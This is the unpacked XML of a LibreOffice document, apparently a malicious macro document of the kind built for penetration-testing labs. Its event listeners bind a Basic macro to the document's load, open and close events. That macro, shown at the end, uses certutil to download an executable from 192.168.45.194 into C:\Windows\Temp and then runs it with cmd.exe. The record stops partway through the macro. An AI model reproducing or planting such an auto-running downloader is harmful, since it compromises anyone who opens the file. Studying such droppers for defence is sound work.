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livermelibr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tart-app" xlink:href="vnd.sun.star.script:Standard.slivermelibres.Main?language=Basic&amp;location=document" xlink:type="simple"/>
      <script:event-listener script:language="ooo:script" script:event-name="office:close-app" xlink:href="vnd.sun.star.script:Standard.slivermelibres.Main?language=Basic&amp;location=document" xlink:type="simple"/>
      <script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.slivermelibres.Main?language=Basic&amp;location=document" xlink:type="simple"/>
      <script:event-listener script:language="ooo:script" script:event-name="office:prepare-unload" xlink:href="vnd.sun.star.script:Standard.slivermelibres.Main?language=Basic&amp;location=document" xlink:type="simple"/>
      <script:event-listener script:language="ooo:script" script:event-name="dom:unload" xlink:href="vnd.sun.star.script:Standard.slivermelibres.Main?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts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22:04:04.893183664</meta:creation-date>
    <dc:date>2023-11-05T22:51:45.104914479</dc:date>
    <meta:editing-duration>PT47M40S</meta:editing-duration>
    <meta:editing-cycles>3</meta:editing-cycles>
    <meta:generator>LibreOffice/7.5.8.1$Linux_X86_64 LibreOffice_project/5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livermelibres"/>
</library:library>
</file>

<file path=Basic/Standard/slivermelibres.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="slivermelibres" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****

Sub Main
Shell("certutil.exe -urlcache -split -f 'http://192.168.45.194/install.exe' 'C:\Windows\Temp\install.exe'")
Shell("C:\Windows\System32\cmd.exe /c 'C:\Windows\Temp\install.exe'"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